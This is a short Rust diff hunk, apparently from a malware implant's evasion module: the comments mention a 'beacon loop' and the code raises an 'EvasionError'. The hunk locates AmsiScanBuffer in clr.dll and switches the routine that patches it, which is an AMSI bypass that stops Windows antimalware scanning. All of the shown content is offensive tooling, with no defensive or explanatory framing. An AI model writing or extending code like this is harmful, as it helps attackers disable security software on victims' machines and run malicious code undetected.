@@ -233,7 +233,7 @@ impl BlindKit for LiveBlind {
                     // loaded (common at cold start), surface as Unresolved so the
                     // caller (beacon loop's per-cycle retry) can try again later.
                     match crate::resolve::export_addr(b"clr.dll", b"AmsiScanBuffer") {
-                        Some(addr) => crate::blind::patch_at(addr),
+                        Some(addr) => crate::blind::patch_clr(addr),
                         None => return Err(EvasionError::Unresolved("clr.dll!AmsiScanBuffer")),
                     }
                 }
